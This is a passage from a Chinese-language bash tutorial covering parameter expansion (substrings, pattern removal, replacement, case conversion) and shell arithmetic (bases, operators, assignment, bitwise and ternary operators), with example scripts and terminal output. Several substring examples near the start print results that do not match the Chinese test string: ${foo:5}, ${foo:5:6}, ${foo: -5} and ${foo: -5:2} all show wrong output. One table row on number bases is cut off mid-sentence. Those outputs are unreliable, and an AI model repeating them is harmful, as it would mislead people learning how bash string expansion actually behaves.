<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=<span class="string">&quot;这个字符串很长。&quot;</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo:5&#125;</span></span><br><span class="line">字符串很长。</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo:5:6&#125;</span></span><br><span class="line">字符串很</span><br></pre></td></tr></table></figure>

<p>如果<em>偏移量</em>的值为负，则表示它从字符串的末尾开始，而不是开头。请注意，负值前面必须有一个空格，以防与${<em>参数</em>:-<em>单词</em>}扩展混淆。如果存在<em>长度</em>，则其值不能小于零。</p>
<p>如果<em>参数</em>是@，扩展的结果是从<em>偏移量</em>开始的<em>长度</em>个位置参数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=<span class="string">&quot;这个字符串很长。&quot;</span></span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo: -5&#125;</span></span><br><span class="line">长。</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo: -5:2&#125;</span></span><br><span class="line">长。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>${<em>参数</em>#<em>模式</em>}</p>
<p>${<em>参数</em>##<em>模式</em>}</p>
</blockquote>
<p>这些扩展</p>
<p>删除<em>参数</em>中包含的字符串的开头部分，由<em>模式</em>定义。<em>模式</em>是像路径名扩展中使用的通配符模式。两种形式的区别在于，#形式删除最短匹配，而##形式删除最长匹配。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=file.txt.zip</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo#*.&#125;</span></span><br><span class="line">txt.zip</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo##*.&#125;</span></span><br><span class="line">zip</span><br></pre></td></tr></table></figure>

<blockquote>
<p>${<em>参数</em>%<em>模式</em>}</p>
<p>${<em>参数</em>%%<em>模式</em>}</p>
</blockquote>
<p>这些扩展与之前的#和##扩展相同，除了它们从<em>参数</em>所包含的字符串的末尾删除文本，而不是从开头。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=file.txt.zip</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo%.*&#125;</span></span><br><span class="line">file.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo%%.*&#125;</span></span><br><span class="line">file</span><br></pre></td></tr></table></figure>

<blockquote>
<p>${<em>参数</em>&#x2F;<em>模式</em>&#x2F;<em>字符串</em>}</p>
<p>${<em>参数</em>&#x2F;&#x2F;<em>模式</em>&#x2F;<em>字符串</em>}</p>
<p>${<em>参数</em>&#x2F;#<em>模式</em>&#x2F;<em>字符串</em>}</p>
<p>${<em>参数</em>&#x2F;%<em>模式</em>&#x2F;<em>字符串</em>}</p>
</blockquote>
<p>这种扩展对<em>参数</em>的内容执行查找和替换操作。如果找到与通配符<em>模式</em>匹配的文本，则用<em>字符串</em>的内容替换之。在普通形式中，只有第一次出现的<em>模式</em>被替换。在&#x2F;&#x2F;形式中，所有出现都被替换。&#x2F;#形式要求匹配出现在字符串的开头，而&#x2F;%形式要求匹配出现在字符串的末尾。在每种形式中，&#x2F;<em>字符串</em>可以省略，导致与<em>模式</em>匹配的文本被删除。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=JPG.JPG</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo/JPG/jpg&#125;</span></span><br><span class="line">jpg.JPG</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo//JPG/jpg&#125;</span></span><br><span class="line">jpg.jpg</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo/#JPG/jpg&#125;</span></span><br><span class="line">jpg.JPG</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$&#123;foo/%JPG/jpg&#125;</span></span><br><span class="line">JPG.jpg</span><br></pre></td></tr></table></figure>

<p>了解参数扩展是一件好事。字符串操作扩展可以用作其他常见命令如sed和cut的替代品。扩展可以通过消除使用外部程序来提高脚本的效率。作为一个例子，我们将修改上一章讨论的longest-word程序，用参数扩展<code>$&#123;#j&#125;替换命令替换$</code>(echo -n $j | wc -c)及其结果的子shell，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># longest-word3: 在文件中找到最长的字符串</span></span><br><span class="line"><span class="keyword">for</span> i; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> [[ -r <span class="string">&quot;<span class="variable">$i</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">    max_word=</span><br><span class="line">    max_len=0</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> $(strings <span class="variable">$i</span>); <span class="keyword">do</span></span><br><span class="line">      len=<span class="string">&quot;<span class="variable">$&#123;#j&#125;</span>&quot;</span></span><br><span class="line">      <span class="keyword">if</span> (( len &gt; max_len )); <span class="keyword">then</span></span><br><span class="line">        max_len=<span class="string">&quot;<span class="variable">$len</span>&quot;</span></span><br><span class="line">        max_word=<span class="string">&quot;<span class="variable">$j</span>&quot;</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>: &#x27;<span class="variable">$max_word</span>&#x27; (<span class="variable">$max_len</span>个字符)&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>接下来，我们将使用time命令比较两个版本的效率。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ time longest-word2 dirlist-usr-bin.txt</span><br><span class="line">dirlist-usr-bin.txt: <span class="string">&#x27;scrollkeeper-get-extended-content-list&#x27;</span> (38个字符)</span><br><span class="line">真实时间 0m3.618s</span><br><span class="line">用户时间 0m1.544s</span><br><span class="line">系统时间 0m1.768s</span><br><span class="line">[me@linuxbox ~]$ time longest-word3 dirlist-usr-bin.txt</span><br><span class="line">dirlist-usr-bin.txt: <span class="string">&#x27;scrollkeeper-get-extended-content-list&#x27;</span> (38个字符)</span><br><span class="line">真实时间 0m0.060s</span><br><span class="line">用户时间 0m0.056s</span><br><span class="line">系统时间 0m0.008s</span><br></pre></td></tr></table></figure>

<p>原始版本的脚本扫描文本文件需要3.618秒，而使用参数扩展的新版本只需要0.06秒——这是一个显著的改进。</p>
<h4 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h4><p>bash有四个参数扩展和两个declare命令选项来支持字符串的大写&#x2F;小写转换。</p>
<p>大小写转换有什么用呢？除了明显的审美价值外，它在编程中扮演着重要角色。让我们考虑一下数据库查找的情况。假设一个用户已经在数据输入字段中输入了一个字符串，我们想在数据库中查找它。用户可能会以全大写字母、全小写字母或两者的组合输入值。我们当然不想在数据库中填充所有可能的大写和小写拼写的排列。怎么办呢？</p>
<p>解决这个问题的常见方法是<em>规范化</em>用户的输入。也就是说，在我们尝试数据库查找之前，将其转换成标准化形式。我们可以通过将用户输入的所有字符转换为小写或大写来做到这一点，并确保数据库条目以相同的方式规范化。</p>
<p>declare命令可用于将字符串规范化为大写或小写。使用declare，我们可以强制变量始终包含所需的格式，无论赋给它什么值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># ul-declare: 通过declare演示大小写转换</span></span><br><span class="line"><span class="built_in">declare</span> -u upper</span><br><span class="line"><span class="built_in">declare</span> -l lower</span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$1</span> ]]; <span class="keyword">then</span></span><br><span class="line">  upper=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  lower=<span class="string">&quot;<span class="variable">$1</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$upper</span>&quot;</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$lower</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>在上述脚本中，我们使用declare创建了两个变量upper和lower。我们将第一个命令行参数（位置参数1）的值分配给这两个变量，然后在屏幕上显示它们。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ul-declare aBc</span><br><span class="line">ABC</span><br><span class="line">abc</span><br></pre></td></tr></table></figure>

<p>正如我们所看到的，命令行参数（aBc）已被规范化。</p>
<p>除了declare之外，还有四个参数扩展执行大小写转换，如表34-1所述。</p>
<p>表34-1：大小写转换参数<em>扩展</em></p>
<table>
<thead>
<tr>
<th><strong>格式</strong></th>
<th><strong>结果</strong></th>
</tr>
</thead>
<tbody><tr>
<td>${<em>参数</em>,,<em>模式</em>}</td>
<td>将<em>参数</em>的值展开为全部小写。<em>模式</em>是一个可选的Shell模式（例如，[A-F]），它将限制哪些字符被转换。详细描述请参阅bash手册页。</td>
</tr>
<tr>
<td>${<em>参数</em>,<em>模式</em>}</td>
<td>将<em>参数</em>的值展开，只改变第一个字符为小写。</td>
</tr>
<tr>
<td>${<em>参数</em>^^<em>模式</em>}</td>
<td>将<em>参数</em>的值展开为全部大写字母。</td>
</tr>
<tr>
<td>${<em>参数</em>^<em>模式</em>}</td>
<td>将<em>参数</em>的值展开，只改变第一个字符为大写（首字母大写）。</td>
</tr>
</tbody></table>
<p>这里是一个演示这些扩展的脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># ul-param: 通过参数扩展演示大小写转换</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;1,,&#125;</span>&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;1,&#125;</span>&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;1^^&#125;</span>&quot;</span></span><br><span class="line"> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;1^&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>脚本运行结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ul-param aBc</span><br><span class="line">abc</span><br><span class="line">aBc</span><br><span class="line">ABC</span><br><span class="line">ABc</span><br></pre></td></tr></table></figure>

<p>再次，我们处理第一个命令行参数，并输出参数扩展支持的四种变化。虽然这个脚本使用了第一个位置参数，<em>参数</em>可以是任何字符串、变量或字符串表达式。</p>
<h3 id="算术评估和扩展"><a href="#算术评估和扩展" class="headerlink" title="算术评估和扩展"></a>算术评估和扩展</h3><p>我们在第7章中研究了算术扩展。它用于对整数执行各种算术操作。其基本形式如下：</p>
<blockquote>
<p>$((<em>表达式</em>))</p>
</blockquote>
<p>其中<em>表达式</em>是一个有效的算术表达式。</p>
<p>这与我们在第27章中遇到的用于算术评估（真值测试）的复合命令(( ))相关。</p>
<p>在之前的章节中，我们看到了一些常见类型的表达式和运算符。这里，我们将看一个更完整的列表。</p>
<h4 id="数字基数"><a href="#数字基数" class="headerlink" title="数字基数"></a>数字基数</h4><p>在第9章中，我们看到了八进制（基数8）和十六进制（基数16）数字。在算术表达式中，Shell支持任何基数的整数常量。表34-2列出了指定基数的符号。</p>
<p><em>表34-2：指定不同数字基数</em></p>
<table>
<thead>
<tr>
<th><strong>符号</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><em>数字</em></td>
<td>默认情况下，没有任何符号的数字被视为十进制（基数10）整数。</td>
</tr>
<tr>
<td>0<em>数字</em></td>
<td>在算术表达式中，带前导零的数字被认为是八进制。</td>
</tr>
<tr>
<td>0x<em>数字</em></td>
<td>十六进制表示法。</td>
</tr>
<tr>
<td><em>基数</em>#<em>数字</em></td>
<td><em>数字</em>是<em>基数</em></td>
</tr>
</tbody></table>
<p>这里是一些示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $((<span class="number">0</span>xff))</span><br><span class="line">255</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $((<span class="number">2#11111111</span>))</span><br><span class="line">255</span><br></pre></td></tr></table></figure>

<p>在前面的示例中，我们打印了十六进制数ff（最大的两位数字）和最大的八位二进制（基数2）数的值。</p>
<h4 id="一元运算符"><a href="#一元运算符" class="headerlink" title="一元运算符"></a>一元运算符</h4><p>有两个一元运算符，+ 和 -，分别用来表示一个数字是正数还是负数。例如，-5。</p>
<h4 id="简单算术"><a href="#简单算术" class="headerlink" title="简单算术"></a>简单算术</h4><p>普通的算术运算符列在表34-3中。</p>
<p><em>表34-3：算术运算符</em></p>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>加法</td>
</tr>
<tr>
<td>-</td>
<td>减法</td>
</tr>
<tr>
<td>*</td>
<td>乘法</td>
</tr>
<tr>
<td>&#x2F;</td>
<td>整数除法</td>
</tr>
<tr>
<td>**</td>
<td>指数运算</td>
</tr>
<tr>
<td>%</td>
<td>取模（余数）</td>
</tr>
</tbody></table>
<p>大多数这些都是不言自明的，但整数除法和取模需要进一步讨论。</p>
<p>由于Shell的算术只操作整数，除法的结果总是整数。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $(( <span class="number">5</span> / <span class="number">2</span> ))</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>这使得在除法操作中确定余数更加重要。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $(( <span class="number">5</span> % <span class="number">2</span> ))</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>通过使用除法和取模运算符，我们可以确定5除以2的结果是2，余数为1。</p>
<p>计算余数在循环中很有用。它允许在循环执行期间以指定的间隔执行操作。在以下示例中，我们显示一行数字，每个5的倍数都突出显示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># modulo: 演示取模运算符</span></span><br><span class="line"><span class="keyword">for</span> ((i = <span class="number">0</span>; i &lt;= <span class="number">20</span>; i = i + <span class="number">1</span>)); <span class="keyword">do</span></span><br><span class="line">  remainder=$((i % <span class="number">5</span>))</span><br><span class="line">  <span class="keyword">if</span> (( remainder == <span class="number">0</span> )); <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">printf</span> <span class="string">&quot;&lt;%d&gt; &quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  	<span class="built_in">printf</span> <span class="string">&quot;%d &quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>

<p>执行时，结果看起来像这样：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ modulo</span><br><span class="line">&lt;0&gt; 1 2 3 4 &lt;5&gt; 6 7 8 9 &lt;10&gt; 11 12 13 14 &lt;15&gt; 16 17 18 19 &lt;20&gt;</span><br></pre></td></tr></table></figure>

<h4 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h4><p>虽然其用途可能不是立即显而易见的，但算术表达式可以执行赋值。我们已经多次执行了赋值，尽管在不同的上下文中。每次我们给一个变量一个值，我们就在执行赋值。我们也可以在算术表达式中这样做。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$foo</span></span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">if</span> (( foo = <span class="number">5</span> )); <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;这是真的。&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">这是真的。</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$foo</span></span><br><span class="line">5</span><br></pre></td></tr></table></figure>

<p>在前面的示例中，我们首先给变量foo赋予一个空值，并验证它确实为空。接下来，我们执行一个if，用复合命令(( foo &#x3D; 5 ))。这个过程做了两件有趣的事情：它将值5赋给变量foo，并且因为foo被赋予了非零值而评估为真。</p>
<p>**注意：**重要的是要记住上述表达式中&#x3D;的确切含义。一个&#x3D;执行赋值。foo &#x3D; 5表示“让foo等于5”，而&#x3D;&#x3D;评估等价性。foo &#x3D;&#x3D; 5表示“foo等于5吗？”这是许多编程语言中的一个常见特性。在Shell中，这可能有点混淆，因为test命令接受单个&#x3D;来进行字符串等价性测试。这是使用更现代的[[ ]]和(( ))复合命令代替test的另一个理由。</p>
<p>除了&#x3D;符号外，Shell还提供了一些非常有用的赋值符号，如表34-4所示。</p>
<p><em>表34-4：赋值运算符</em></p>
<table>
<thead>
<tr>
<th><strong>符号</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><em>参数</em> &#x3D; <em>值</em></td>
<td>简单赋值。将<em>值</em>赋给<em>参数</em>。</td>
</tr>
<tr>
<td><em>参数</em> +&#x3D; <em>值</em></td>
<td>加法。等价于<em>参数</em> &#x3D; <em>参数</em> + <em>值</em>。</td>
</tr>
<tr>
<td><em>参数</em> -&#x3D; <em>值</em></td>
<td>减法。等价于<em>参数</em> &#x3D; <em>参数</em> - <em>值</em>。</td>
</tr>
<tr>
<td><em>参数</em> *&#x3D; <em>值</em></td>
<td>乘法。等价于<em>参数</em> &#x3D; <em>参数</em> * <em>值</em>。</td>
</tr>
<tr>
<td><em>参数</em> &#x2F;&#x3D; <em>值</em></td>
<td>整数除法。等价于<em>参数</em> &#x3D; <em>参数</em> &#x2F; <em>值</em>。</td>
</tr>
<tr>
<td><em>参数</em> %&#x3D; <em>值</em></td>
<td>取模。等价于<em>参数</em> &#x3D; <em>参数</em> % <em>值</em>。</td>
</tr>
<tr>
<td><em>参数</em>++</td>
<td>变量后增。等价于<em>参数</em> &#x3D; <em>参数</em> + 1（然而，见下文讨论）。</td>
</tr>
<tr>
<td><em>参数</em>−−</td>
<td>变量后减。等价于<em>参数</em> &#x3D; <em>参数</em> − 1。</td>
</tr>
<tr>
<td>++<em>参数</em></td>
<td>变量前增。等价于<em>参数</em> &#x3D; <em>参数</em> + 1。</td>
</tr>
<tr>
<td>–<em>参数</em></td>
<td>变量前减。等价于<em>参数</em> &#x3D; <em>参数</em> − 1。</td>
</tr>
</tbody></table>
<p>这些赋值运算符为许多常见的算术任务提供了方便的简写。特别值得注意的是增量（++）和减量（−−）运算符，它们分别将其参数的值增加或减少一。这种符号风格来自C编程语言，并已被纳入包括bash在内的许多其他编程语言。</p>
<p>这些运算符可以出现在参数的前面或后面。虽然它们都将参数增加或减少一，但两种放置位置有一个微妙的区别。如果放在参数的前面，参数在返回之前增加（或减少）。如果放在后面，则操作在参数返回<em>之后</em>执行。这有点奇怪，但这是预期的行为。这是一个演示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=1</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $((foo++))</span><br><span class="line">1</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$foo</span></span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>如果我们给变量foo赋值为一，然后用++运算符在参数名后增加它，foo返回的值为一。然而，如果我们第二次查看变量的值，我们看到增加后的值。如果我们将++运算符放在参数前面，我们得到更期望的行为。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ foo=1</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> $((++foo))</span><br><span class="line">2</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$foo</span></span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>对于大多数Shell应用来说，前缀运算符会是最有用的。</p>
<p>++和–运算符经常与循环一起使用。我们将对我们的modulo脚本进行一些改进，使其更紧凑一些。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># modulo2: 演示取模运算符</span></span><br><span class="line"><span class="keyword">for</span> ((i = <span class="number">0</span>; i &lt;= <span class="number">20</span>; ++i )); <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> (((i % <span class="number">5</span>) == <span class="number">0</span> )); <span class="keyword">then</span></span><br><span class="line">  	<span class="built_in">printf</span> <span class="string">&quot;&lt;%d&gt; &quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  	<span class="built_in">printf</span> <span class="string">&quot;%d &quot;</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="位操作"><a href="#位操作" class="headerlink" title="位操作"></a>位操作</h4><p>一类运算符以一种不寻常的方式操作数字。这些运算符在位级别上工作。它们用于某些类型的低级任务，通常涉及设置或读取位标志。位运算符列在表34-5中。</p>
<p><em>表34-5：位运算符</em></p>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>~</td>
<td>位取反。对一个数字的所有位进行取反。</td>
</tr>
<tr>
<td>&lt;&lt;</td>
<td>左位移。将一个数字中的所有位向左移动。</td>
</tr>
<tr>
<td>&gt;&gt;</td>
<td>右位移。将一个数字中的所有位向右移动。</td>
</tr>
<tr>
<td>&amp;</td>
<td>位与。对两个数字中的所有位执行与操作。</td>
</tr>
<tr>
<td>|</td>
<td>位或。对两个数字中的所有位执行或操作。</td>
</tr>
<tr>
<td>^</td>
<td>位异或。对两个数字中的所有位执行异或操作。</td>
</tr>
</tbody></table>
<p>请注意，除了位取反外，所有这些都有相应的赋值运算符（例如，&lt;&lt;&#x3D;）。</p>
<p>这里我们将演示使用左位移运算符产生2的幂的列表：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="keyword">for</span> ((i=<span class="number">0</span>;i&lt;<span class="number">8</span>;++i)); <span class="keyword">do</span> <span class="built_in">echo</span> $((<span class="number">1</span>&lt;&lt;i)); <span class="keyword">done</span></span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">4</span><br><span class="line">8</span><br><span class="line">16</span><br><span class="line">32</span><br><span class="line">64</span><br><span class="line">128</span><br></pre></td></tr></table></figure>

<h4 id="逻辑"><a href="#逻辑" class="headerlink" title="逻辑"></a>逻辑</h4><p>正如我们在第27章中发现的，(( ))复合命令支持多种比较运算符。还有一些更多的可以用来评估逻辑的运算符。表34-6提供了完整的列表。</p>
<p><em>表34-6：比较运算符</em></p>
<table>
<thead>
<tr>
<th><strong>运算符</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&lt;&#x3D;</td>
<td>小于或等于。</td>
</tr>
<tr>
<td>&gt;&#x3D;</td>
<td>大于或等于。</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于。</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于。</td>
</tr>
<tr>
<td>&#x3D;&#x3D;</td>
<td>等于。</td>
</tr>
<tr>
<td>!&#x3D;</td>
<td>不等于。</td>
</tr>
<tr>
<td>&amp;&amp;</td>
<td>逻辑与。</td>
</tr>
<tr>
<td>||</td>
<td>逻辑或。</td>
</tr>
<tr>
<td><em>expr1</em>?<em>expr2</em>:<em>expr3</em></td>
<td>比较（三元）运算符。如果表达式<em>expr1</em>评估为非零（算术真），则<em>expr2</em>；否则<em>expr3</em>。</td>
</tr>
</tbody></table>
<p>当用于逻辑操作时，表达式遵循算术逻辑的规则；即，评估为零的表达式被认为是假的，而非零表达式被认为是真的。(( ))复合命令将结果映射到Shell的正常退出代码中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="keyword">if</span> ((<span class="number">1</span>)); <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;真&quot;</span>; <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">&quot;假&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">真</span><br><span class="line">[me@linuxbox ~]$ <span class="keyword">if</span> ((<span class="number">0</span>)); <span class="keyword">then</span> <span class="built_in">echo</span> <span class="string">&quot;真&quot;</span>; <span class="keyword">else</span> <span class="built_in">echo</span> <span class="string">&quot;假&quot;</span>; <span class="keyword">fi</span></span><br><span class="line">假</span><br></pre></td></tr></table></figure>

<p>逻辑运算符中最奇怪的是<em>三元运算符</em>。这个运算符（模仿C编程语言中的）执行一个独立的逻辑测试。它可以用作一种if&#x2F;then&#x2F;else语句。它作用于三个算术表达式（字符串不行），如果第一个表达式为真（或非零），则执行第二个表达式。否则，执行第三个表达式。我们可以在命令行上尝试这个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ a=0</span><br><span class="line">[me@linuxbox ~]$ ((a&lt;<span class="number">1</span>?++a:--a))</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">1</span><br><span class="line">[me@linuxbox ~]$ ((a&lt;<span class="number">1</span>?++a:--a))</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>在这里我们看到三元运算符的动作。这个例子实现了一个切换。每次操作时，变量a的值从零切换到一，或者反之。</p>
<p>请注意，在表达式中执行赋值并不直接。尝试这样做时，bash会声明一个错误。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ a=0</span><br><span class="line">[me@linuxbox ~]$ ((a&lt;<span class="number">1</span>?a+=<span class="number">1</span>:a-=<span class="number">1</span>))</span><br><span class="line">bash: ((: a&lt;<span class="number">1</span>?a+=<span class="number">1</span>:a-=<span class="number">1</span>: 尝试对非变量进行赋值（错误</span><br><span class="line">标记是“-=<span class="number">1</span>”）</span><br></pre></td></tr></table></figure>

<p>通过用括号包围赋值表达式，可以缓解这个问题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ ((a&lt;<span class="number">1</span>?(a+=<span class="number">1</span>):(a-=<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>

<p>下一个是使用算术运算符的脚本的更完整示例，该脚本生成一个简单的数字表。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># arith-loop: 脚本展示算术运算符</span></span><br><span class="line">finished=0</span><br><span class="line">a=0</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;a\ta**2\ta**3\n&quot;</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;=\t====\t====\n&quot;</span></span><br><span class="line"><span class="keyword">until</span> ((finished)); <span class="keyword">do</span></span><br><span class="line">  b=$((a**<span class="number">2</span>))</span><br><span class="line">  c=$((a**<span class="number">3</span>))</span><br><span class="line">  <span class="built_in">printf</span> <span class="string">&quot;%d\t%d\t%d\n&quot;</span> <span class="string">&quot;<span class="variable">$a</span>&quot;</span> <span class="string">&quot;<span class="variable">$b</span>&quot;</span> <span class="string">&quot;<span class="variable">$c</span>&quot;</span></span><br><span class="line">  ((a&lt;<span class="number">10</span>?++a:(finished=<span class="number">1</span>)))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>在这个脚本中，我们基于finished变量的值实现了一个until循环。最初，变量被设置为零（算术假），我们继续循环直到它变为非零。在循环中，我们计算计数器变量a的平方和立方。在循环结束时，计数器变量的值被评估。如果它小于10（迭代的最大次数），则它被加一，否则变量finished被赋值为一，使finished在算术上为真，从而终止循环。运行脚本得到这个结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ arith-loop</span><br><span class="line">a a**2 a**3</span><br><span class="line">= ==== ====</span><br><span class="line">0 0 0</span><br><span class="line">1 1 1</span><br><span class="line">2 4 8</span><br><span class="line">3 9 27</span><br><span class="line">4 16 64</span><br><span class="line">5 25 125</span><br><span class="line">6 36 216</span><br><span class="line">7 49 343</span><br><span class="line">8 64 512</span><br><span class="line">9 81 729</span><br><span class="line">10 100 1000</span><br></pre></td></tr></table></figure>

